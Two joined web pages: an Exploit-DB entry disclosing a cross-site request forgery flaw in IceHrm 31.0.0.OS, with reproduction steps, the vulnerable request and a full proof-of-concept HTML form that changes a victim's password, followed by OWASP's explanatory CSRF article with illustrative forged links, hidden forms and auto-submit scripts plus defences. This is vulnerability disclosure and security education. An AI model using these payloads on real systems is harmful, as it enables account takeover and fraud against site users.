=== Content from www.exploit-db.com_5782bcfb_20250114_205818.html ===

[![Exploit Database](/images/spider-white.png)](/)
[Exploit Database](/)

* [Exploits](/)
* [GHDB](/google-hacking-database)
* [Papers](/papers)
* [Shellcodes](/shellcodes)

---

* [Search EDB](/search)
* [SearchSploit Manual](/searchsploit)
* [Submissions](/submit)

---

* [Online Training](https://www.offsec.com/)

[![Exploit Database](/images/edb-logo.png)](/)

* [Stats](/exploit-database-statistics)
* [About Us](/)

  [About Exploit-DB](/about-exploit-db)
  [Exploit-DB History](/history)
  [FAQ](/faq)
* Search

# ICEHRM 31.0.0.0S - Cross-site Request Forgery (CSRF) to Account Takeover

#### EDB-ID:

###### 50831

#### CVE:

###### N/A

---

**EDB Verified:**

#### Author:

###### [Devansh Bordia](/?author=11603)

#### Type:

###### [webapps](/?type=webapps)

---

#### Platform:

###### [PHP](/?platform=php)

#### Date:

###### 2022-03-22

---

**Vulnerable App:**

```
# Exploit Title: ICEHRM 31.0.0.0S - Cross-site Request Forgery (CSRF) to Account Takeover
# Date: 18/03/2022
# Exploit Author: Devansh Bordia
# Vendor Homepage: https://icehrm.com/
# Software Link: https://github.com/gamonoid/icehrm/releases/tag/v31.0.0.OS
# Version: 31.0.0.OS
#Tested on: Windows 10

1. About - ICEHRM
IceHrm employee management system allows companies to centralize confidential employee information and define access permissions to authorized personnel to ensure that employee information is both secure and accessible.

2. Description:
The application has an update password feature which has a CSRF vulnerability that allows an attacker to change the password of any arbitrary user leading to an account takeover.

3. Steps To Reproduce:
- Create an User name:Gaurav with permission of the Employee using the Admin User of the application and set his password.
- Now login into the application using his credentials and navigate to Update Password Feature to change the password.
- Intercept the request in Proxy and we can see there is a GET request used to change password and also NO CSRF Token is being used.
- Finally using Burpsuite create CSRF POC and save it as exploit.html.
- Now change the password in the POC to any password we want.
- Finally we open this POC in the same browser session and click on the submit button.
- At last when retrying to login into the application we can see that password has been reset for the account leading to account takeover.

4. Vulnerable Request:

GET
/app/service.php?t=Employee&a=ca&sa=changePassword&mod=modules=employees&req={"current":"Test@123
","pwd":"Dummy@123"} HTTP/1.1
Host: localhost:8070
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0)
Gecko/20100101 Firefox/98.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer:
http://localhost:8070/app/?g=modules&n=employees&m=module_Personal_Information
Cookie: PHPSESSID=k8d27ve456j0jb56ga885j1vvb
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

5. Exploit POC (exploit.html)

<html>

<!-- CSRF PoC - generated by Burp Suite Professional -->

<body>

<script>history.pushState('', '', '/')</script>

<form action="http://localhost:8070/app/service.php">

<input type="hidden" name="t" value="Employee" />

<input type="hidden" name="a" value="ca" />

<input type="hidden" name="sa" value="changePassword" />

<input type="hidden" name="mod" value="modules&#61;employees" />

<input type="hidden" name="req"
value="&#123;"current"&#58;"Test&#64;123"&#44;"pwd"&#58;"Dummy&#64;123"&#125;"
/>

<input type="submit" value="Submit request" />

</form>

</body>

</html>

```

**Tags:**

**Advisory/Source:**
Link

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/statistics) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Databases
[Exploits](/)
[Google Hacking](/google-hacking-database)
[Papers](/papers)
[Shellcodes](/shellcodes)

Links
[Search Exploit-DB](/search)
[Submit Entry](/submit)
[SearchSploit Manual](/searchsploit)
[Exploit Statistics](/statistics)

Sites
[OffSec](https://www.offsec.com)
[Kali Linux](https://www.kali.org/)
[VulnHub](https://www.vulnhub.com)

Solutions
[Courses and Certifications](https://www.offsec.com/courses-and-certifications/)
[Learn Subscriptions](https://www.offsec.com/learn/)
[OffSec Cyber Range](https://www.offsec.com/cyber-range/)
[Proving Grounds](https://www.offsec.com/labs/)
[Penetration Testing Services](https://www.offsec.com/penetration-testing/)

* [Exploit Database by OffSec](/)
* [Terms](/terms)
* [Privacy](/privacy)
* [About Us](/about-exploit-db)
* [FAQ](/faq)
* [Cookies](/cookies)

©
[OffSec Services Limited](https://www.offsec.com/) 2025. All rights reserved.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

Close

##### OffSec Resources

×

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
|  | [Proving Grounds](https://www.offsec.com/labs/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/serchsploit) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Close

##### Search The Exploit Database

×

Title

CVE

Type

dos

local

remote

shellcode

papers

webapps

Platform

AIX

ASP

BSD

BSD\_PPC

BSD\_x86

BSDi\_x86

CGI

FreeBSD

FreeBSD\_x86

FreeBSD\_x86-64

Generator

Hardware

HP-UX

IRIX

JSP

Linux

Linux\_MIPS

Linux\_PPC

Linux\_SPARC

Linux\_x86

Linux\_x86-64

MINIX

Multiple

NetBSD\_x86

Novell

OpenBSD

OpenBSD\_x86

OSX\_PPC

OSX

PHP

Plan9

QNX

SCO

SCO\_x86

Solaris

Solaris\_SPARC

Solaris\_x86

Tru64

ULTRIX

Unix

UnixWare

Windows\_x86

Windows\_x86-64

Windows

ARM

CFM

Netware

SuperH\_SH4

Java

BeOS

Immunix

Palm\_OS

AtheOS

iOS

Android

XML

Perl

Python

System\_z

JSON

ASHX

Ruby

ASPX

macOS

Linux\_CRISv32

eZine

Magazine

NodeJS

Alpha

Solaris\_MIPS

Lua

watchOS

VxWorks

Python2

Python3

TypeScript

Go

Author

Content

Port

14

21

22

23

25

42

49

53

66

69

70

79

80

81

102

105

110

111

113

119

123

135

139

143

161

162

164

383

389

402

406

411

443

444

445

446

502

504

513

514

515

532

548

554

555

617

623

631

655

689

783

787

808

873

888

901

998

1000

1040

1089

1099

1100

1114

1120

1194

1235

1471

1521

1533

1581

1589

1604

1617

1723

1743

1761

1812

1858

1861

1900

1947

2000

2022

2049

2100

2103

2121

2125

2181

2242

2315

2375

2380

2381

2401

2480

2525

2640

2810

2812

2947

2954

2990

3000

3030

3050

3052

3128

3129

3181

3200

3217

3306

3333

3378

3389

3460

3465

3500

3535

3632

3690

3790

3814

3817

4000

4002

4070

4081

4105

4111

4322

4343

4434

4444

4501

4555

4592

4661

4750

4848

5000

5060

5061

5080

5081

5093

5151

5180

5247

5250

5272

5308

5432

5466

5554

5555

5600

5655

5666

5800

5803

5814

5858

5900

5984

6066

6070

6080

6082

6101

6112

6129

6379

6502

6503

6660

6667

7001

7002

7070

7071

7080

7100

7144

7210

7272

7290

7426

7443

7510

7547

7649

7770

7777

7778

7787

7879

7902

8000

8001

8002

8004

8008

8020

8022

8023

8028

8030

8080

8081

8082

8088

8090

8181

8300

8400

8443

8445

8473

8500

8585

8619

8800

8812

8839

8880

8888

9000

9001

9002

9080

9090

9091

9100

9124

9200

9251

9256

9443

9447

9784

9788

9855

9876

9900

9987

9993

9999

10000

10001

10080

10202

10203

10443

10616

11000

11211

11460

12203

12221

12345

12397

12401

13327

13701

13722

13838

16992

18821

18881

19000

19810

19813

20000

20002

20010

20031

20111

20171

22003

23423

25672

26000

27015

27700

28015

30000

30303

31337

32400

32674

32764

34205

37215

37777

37848

38292

40007

41523

44334

46824

48080

49152

50000

50496

52311

52789

52869

52986

53413

54345

54890

55554

55555

56380

57772

58080

62514

Tag

WordPress Core

Metasploit Framework (MSF)

WordPress Plugin

SQL Injection (SQLi)

Cross-Site Scripting (XSS)

File Inclusion (LFI/RFI)

Cross-Site Request Forgery (CSRF)

Denial of Service (DoS)

Code Injection

Command Injection

Authentication Bypass / Credentials Bypass (AB/CB)

Client Side

Use After Free (UAF)

Out Of Bounds

Remote

Local

XML External Entity (XXE)

Integer Overflow

Server-Side Request Forgery (SSRF)

Race Condition

NULL Pointer Dereference

Malware

Buffer Overflow

Heap Overflow

Type Confusion

Object Injection

Bug Report

Console

Pwn2Own

Traversal

Deserialization

Verified

Has App

No Metasploit

Search



=== Content from owasp.org_991627a0_20250114_205817.html ===


For full functionality of this site it is necessary to enable JavaScript. Here are the  [instructions how to enable JavaScript in your web browser](http://turnonjs.com/).

[![OWASP logo](https://owasp.org/assets/images/logo.png)](https://owasp.org/)

[![](https://owasp.org/assets/images/logo.png)](https://owasp.org/)

 [Store](https://owasp.org/store)
[Donate](https://owasp.org/donate?reponame=www-community)
[Join](https://owasp.org/membership)

This website uses cookies to analyze our traffic and only share that information with our analytics partners.

Accept

x

[Store](https://owasp.org/store)
[Donate](https://owasp.org/donate?reponame=www-community)
[Join](https://owasp.org/membership)

# Cross Site Request Forgery (CSRF)

**Author:** KirstenS

**Contributor(s):** Dave Wichers, Davisnw, Paul Petefish, Adar Weidman, Michael Brooks, Ahsan Mir, Dc, D0ubl3 h3lix, Jim Manico, Robert Gilbert, Tgondrom, Pawel Krawczyk, Brandt, A V Minhaz, Kevin Lorenzo, Andrew Smith, Christina Schelin, Ari Elias-Bachrach, Sarciszewski, kingthorin, Ben Spatafora, Krishna Madala

## Overview

Cross-Site Request Forgery (CSRF) is an attack that forces an end user
to execute unwanted actions on a web application in which they’re
currently authenticated. With a little help of social engineering
(such as sending a link via email or chat), an attacker may trick the
users of a web application into executing actions of the attacker’s
choosing. If the victim is a normal user, a successful CSRF attack can
force the user to perform state changing requests like transferring
funds, changing their email address, and so forth. If the victim is an
administrative account, CSRF can compromise the entire web application.

## Related Security Activities

### How to Review Code for CSRF Vulnerabilities

See the [OWASP Code Review
Guide](/www-project-code-review-guide) article on how to
[review code for CSRF
vulnerabilities](/www-project-code-review-guide/reviewing-code-for-csrf-issues).

### How to Test for CSRF Vulnerabilities

See the [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/) article on how to
test for CSRF vulnerabilities.

### How to Prevent CSRF Vulnerabilities

See the [CSRF Prevention Cheat
Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html) for prevention measures.

Listen to the [OWASP Top Ten CSRF
Podcast](http://wiki.owasp.org/download/jmanico/owasp_podcast_69.mp3).

Most frameworks have built-in CSRF support such as
[Joomla](http://docs.joomla.org/How_to_add_CSRF_anti-spoofing_to_forms),
[Spring](http://blog.eyallupu.com/2012/04/csrf-defense-in-spring-mvc-31.html),
[Struts](http://web.securityinnovation.com/appsec-weekly/blog/bid/84318/Cross-Site-Request-Forgery-CSRF-Prevention-Using-Struts-2),
[Ruby on
Rails](http://guides.rubyonrails.org/security.html#cross-site-request-forgery-csrf),
[.NET](https://www.troyhunt.com/2010/11/owasp-top-10-for-net-developers-part-5.html)
and others.

Use [OWASP CSRF Guard](/www-project-csrfguard/) to
add CSRF protection to your Java applications. You can use
[CSRFProtector Project](/www-project-csrfprotector/) to protect
your PHP applications or any project deployed using Apache Server.

John Melton also has an [excellent blog
post](http://www.jtmelton.com/2010/05/16/the-owasp-top-ten-and-esapi-part-6-cross-site-request-forgery-csrf/)
describing how to use the native anti-CSRF functionality of the [OWASP
ESAPI](http://www.owasp.org/index.php/Category%3AOWASP_Enterprise_Security_API).

## Description

CSRF is an attack that tricks the victim into submitting a malicious
request. It inherits the identity and privileges of the victim to
perform an undesired function on the victim’s behalf (though note that
this is not true of login CSRF, a special form of the attack described
below). For most sites, browser requests automatically include any
credentials associated with the site, such as the user’s session
cookie, IP address, Windows domain credentials, and so forth.
Therefore, if the user is currently authenticated to the site, the site
will have no way to distinguish between the forged request sent by the
victim and a legitimate request sent by the victim.

CSRF attacks target functionality that causes a state change on the
server, such as changing the victim’s email address or password, or
purchasing something. Forcing the victim to retrieve data doesn’t
benefit an attacker because the attacker doesn’t receive the response,
the victim does. As such, CSRF attacks target state-changing requests.

An attacker can use CSRF to obtain the victim’s private data via a
special form of the attack, known as login CSRF. The attacker forces
a non-authenticated user to log in to an account the attacker controls.
If the victim does not realize this, they may add personal data—such as
credit card information—to the account. The attacker can then log back
into the account to view this data, along with the victim’s activity
history on the web application.

It’s sometimes possible to store the CSRF attack on the vulnerable site
itself. Such vulnerabilities are called “stored CSRF flaws”. This can be
accomplished by simply storing an IMG or IFRAME tag in a field that
accepts HTML, or by a more complex cross-site scripting attack. If the
attack can store a CSRF attack in the site, the severity of the attack
is amplified. In particular, the likelihood is increased because the
victim is more likely to view the page containing the attack than some
random page on the Internet. The likelihood is also increased because
the victim is sure to be authenticated to the site already.

### Synonyms

CSRF attacks are also known by a number of other names, including XSRF,
“Sea Surf”, Session Riding, Cross-Site Reference Forgery, and Hostile
Linking. Microsoft refers to this type of attack as a One-Click attack
in their threat modeling process and many places in their online
documentation.

## Prevention measures that do **NOT** work

A number of flawed ideas for defending against CSRF attacks have been
developed over time. Here are a few that we recommend you avoid.

### Using a secret cookie

Remember that all cookies, even the *secret* ones, will be submitted
with every request. All authentication tokens will be submitted
regardless of whether or not the end-user was tricked into submitting
the request. Furthermore, session identifiers are simply used by the
application container to associate the request with a specific session
object. The session identifier does not verify that the end-user
intended to submit the request.

### Only accepting POST requests

Applications can be developed to only accept POST requests for the
execution of business logic. The misconception is that since the
attacker cannot construct a malicious link, a CSRF attack cannot be
executed. Unfortunately, this logic is incorrect. There are numerous
methods in which an attacker can trick a victim into submitting a forged
POST request, such as a simple form hosted in an attacker’s Website with
hidden values. This form can be triggered automatically by JavaScript or
can be triggered by the victim who thinks the form will do something
else.

### Multi-Step Transactions

Multi-Step transactions are not an adequate prevention of CSRF. As long
as an attacker can predict or deduce each step of the completed
transaction, then CSRF is possible.

### URL Rewriting

This might be seen as a useful CSRF prevention technique as the attacker
cannot guess the victim’s session ID. However, the user’s session ID is
exposed in the URL. We don’t recommend fixing one security flaw by
introducing another.

### HTTPS

HTTPS by itself does nothing to defend against CSRF.

However, HTTPS should be considered a prerequisite for any preventative
measures to be trustworthy.

### Validating the Referrer Header

This doesn’t work in practice because the referrer header can be easily
spoofed by an attacker. Additionally, some users or browsers might not
send the referrer header due to privacy settings or policies, leading to false
positives. Moreover, there are situations where the referrer can be null, such
as when a user navigates to a site from a bookmark or any other resource without
a traditional url. In these scenarios, legitimate requests could be mistaken as
potential CSRF attacks, which would result in more potential false positive flags.

## Examples

### How does the attack work?

There are numerous ways in which an end user can be tricked into loading
information from or submitting information to a web application. In
order to execute an attack, we must first understand how to generate a
valid malicious request for our victim to execute. Let us consider the
following example: Alice wishes to transfer $100 to Bob using the
*bank.com* web application that is vulnerable to CSRF. Maria, an
attacker, wants to trick Alice into sending the money to Maria instead.
The attack will comprise the following steps:

1. Building an exploit URL or script
2. Tricking Alice into executing the action with [Social Engineering](https://en.wikipedia.org/wiki/Social_engineering_%28security%29)

#### GET scenario

If the application was designed to primarily use GET requests to
transfer parameters and execute actions, the money transfer operation
might be reduced to a request like:

`GET http://bank.com/transfer.do?acct=BOB&amount=100 HTTP/1.1`

Maria now decides to exploit this web application vulnerability using
Alice as the victim. Maria first constructs the following exploit URL
which will transfer $100,000 from Alice’s account to Maria’s account. Maria
takes the original command URL and replaces the beneficiary name with
herself, raising the transfer amount significantly at the same time:

`http://bank.com/transfer.do?acct=MARIA&amount=100000`

The [social engineering](https://en.wikipedia.org/wiki/Social_engineering_%28security%29) aspect of the
attack tricks Alice into loading this URL when Alice is logged into the
bank application. This is usually done with one of the following
techniques:

* sending an unsolicited email with HTML content
* planting an exploit URL or script on pages that are likely to be visited by the victim while they are also doing online banking

The exploit URL can be disguised as an ordinary link, encouraging the
victim to click it:

`<a href="http://bank.com/transfer.do?acct=MARIA&amount=100000">View my Pictures!</a>`

Or as a 0x0 fake image:

`<img src="http://bank.com/transfer.do?acct=MARIA&amount=100000" width="0" height="0" border="0">`

If this image tag were included in the email, Alice wouldn’t see
anything. However, the browser *will still* submit the request to
bank.com without any visual indication that the transfer has taken
place.

A real life example of CSRF attack on an application using GET was a
[uTorrent
exploit](https://www.ghacks.net/2008/01/17/dos-vulnerability-in-utorrent-and-bittorrent/)
from 2008 that was used on a mass scale to download malware.

#### POST scenario

The only difference between GET and POST attacks is how the attack is
being executed by the victim. Let’s assume the bank now uses POST and
the vulnerable request looks like this:

```
POST http://bank.com/transfer.do HTTP/1.1

acct=BOB&amount=100

```

Such a request cannot be delivered using standard A or IMG tags, but can
be delivered using a FORM tags:

```
<form action="http://bank.com/transfer.do" method="POST">

<input type="hidden" name="acct" value="MARIA"/>
<input type="hidden" name="amount" value="100000"/>
<input type="submit" value="View my pictures"/>

</form>

```

This form will require the user to click on the submit button, but this
can be also executed automatically using JavaScript:

```
<body onload="document.forms[0].submit()">

<form...

```
#### Other HTTP methods

Modern web application APIs frequently use other HTTP methods, such as
PUT or DELETE. Let’s assume the vulnerable bank uses PUT that takes a
JSON block as an argument:

```
PUT http://bank.com/transfer.do HTTP/1.1

{ "acct":"BOB", "amount":100 }

```

Such requests can be executed with JavaScript embedded into an exploit
page:

```
<script>
function put() {
    var x = new XMLHttpRequest();
    x.open("PUT","http://bank.com/transfer.do",true);
    x.setRequestHeader("Content-Type", "application/json");
    x.send(JSON.stringify({"acct":"BOB", "amount":100}));
}
</script>

<body onload="put()">

```

Fortunately, this request will **not** be executed by modern web
browsers thanks to [same-origin policy](https://en.wikipedia.org/wiki/Same-origin_policy)
restrictions. This restriction is enabled by default unless the target
web site explicitly opens up cross-origin requests from the attacker’s
(or everyone’s) origin by using
[CORS](https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html)
with the following header:

`Access-Control-Allow-Origin: *`

## Related [Attacks](https://owasp.org/www-community/attacks/)

* [Cross-site Scripting (XSS)](https://owasp.org/www-community/attacks/xss/)
* [Cross Site History Manipulation (XSHM)](https://owasp.org/www-community/attacks/Cross_Site_History_Manipulation_%28XSHM%29)

## Related [Controls](https://owasp.org/www-community/controls/)

* Add a per-request nonce to the URL and all forms in addition to the standard session. This is also referred to as “form keys”. Many frameworks (e.g., Drupal.org 4.7.4+) either have or are starting to include this type of protection “built-in” to every form so the programmer does not need to code this protection manually.
* Add a hash (session id, function name, server-side secret) to all forms.
* For .NET, add a session identifier to ViewState with MAC (described in detail in [the DotNet Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/DotNet_Security_Cheat_Sheet.html#asp-net-web-forms-guidance)).
* Checking the referrer header in the client’s HTTP request can prevent CSRF attacks. Ensuring that the HTTP request has come from the original site means that attacks from other sites will not function. It is very common to see referrer header checks used on embedded network hardware due to memory limitations.
  + XSS can be used to bypass both referrer and token based checks simultaneously. For instance, the [Samy worm](https://en.wikipedia.org/wiki/Samy_%28computer_worm%29) used an `XMLHttpRequest` to obtain the CSRF token to forge requests.
* “Although CSRF is fundamentally a problem with the web application, not the user, users can help protect their accounts at poorly designed sites by logging off the site before visiting another, or clearing their browser’s cookies at the end of each browser session.” –http://en.wikipedia.org/wiki/Cross-site\_request\_forgery#\_note-1

## References

* OWASP [Cross-Site Request Forgery (CSRF) Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
* [The Cross-Site Request Forgery (CSRF/XSRF) FAQ](http://www.cgisecurity.com/articles/csrf-faq.shtml)

> “This paper serves as a living document for Cross-Site Request Forgery issues. This document will serve as a repository of information from existing papers, talks, and mailing list postings and will be updated as new information is discovered.”\*

* [Testing for CSRF](%5Cwww-project-web-security-testing-guide%5C)
  + CSRF (aka Session riding) paper from the OWASP Testing Guide project.
* [CSRF Vulnerability: A ‘Sleeping Giant’](https://www.darkreading.com/risk/csrf-vulnerability-a-sleeping-giant/d/d-id/1128371)
  + Overview Paper
* [Client Side Protection against Session Riding](https://wiki.owasp.org/index.php/File%3ARequestRodeo-MartinJohns.pdf)
  + Martin Johns and Justus Winter’s interesting paper and presentation for the 4th OWASP AppSec Conference which described potential techniques that browsers could adopt to automatically provide CSRF protection - [PDF paper](https://wiki.owasp.org/index.php/File%3ARequestRodeo-MartinJohns.pdf)
* [OWASP CSRF Guard](/www-project-csrfguard/)
  + J2EE, .NET, and PHP Filters which append a unique request token to each form and link in the HTML response in order to provide universal coverage against CSRF throughout your entire application.
* [OWASP CSRF Protector](/www-project-csrfprotector/)
  + Anti CSRF method to mitigate CSRF in web applications. Currently implemented as a PHP library & Apache 2.x.x module
* [A Most-Neglected Fact About Cross Site Request Forgery (CSRF)](http://yehg.net/lab/pr0js/view.php/A_Most-Neglected_Fact_About_CSRF.pdf)
  + Aung Khant, <http://yehg.net>, explained the danger and impact of CSRF with imperiling scenarios.
* [Pinata-CSRF-Tool: CSRF POC tool](https://code.google.com/p/pinata-csrf-tool/)
  + Pinata makes it easy to create Proof of Concept CSRF pages. Assists in Application Vulnerability Assessment.

---

[Watch](https://github.com/owasp/www-community/subscription)
[Star](https://github.com/owasp/www-community)

**The OWASP® Foundation** works to improve the security of software through its community-led open source software projects,
hundreds of chapters worldwide, tens of thousands of members, and by hosting local and global conferences.
### Important Community Links

* [Community](/www-community/)
* Attacks (You are here)
* [Vulnerabilities](/www-community/vulnerabilities)
* [Controls](/www-community/controls)

### Upcoming OWASP Global Events

## Corporate Supporters

[Become a corporate supporter](https://owasp.org/supporters)

* [HOME](https://owasp.org/)
* [PROJECTS](https://owasp.org/projects/)
* [CHAPTERS](https://owasp.org/chapters/)
* [EVENTS](https://owasp.org/events/)
* [ABOUT](https://owasp.org/about/)
* [PRIVACY](https://owasp.org/www-policy/operational/privacy)
* [SITEMAP](https://owasp.org/sitemap/)
* [CONTACT](https://owasp.org/contact/)

OWASP, the OWASP logo, and Global AppSec are registered trademarks and AppSec Days, AppSec California, AppSec Cali, SnowFROC, and LASCON are trademarks of the OWASP Foundation, Inc. Unless otherwise specified, all content on the site is Creative Commons Attribution-ShareAlike v4.0 and provided without warranty of service or accuracy. For more information, please refer to our [General Disclaimer](/www-policy/operational/general-disclaimer.html). OWASP does not endorse or recommend commercial products or services, allowing our community to remain vendor neutral with the collective wisdom of the best minds in software security worldwide. Copyright 2025, OWASP Foundation, Inc.


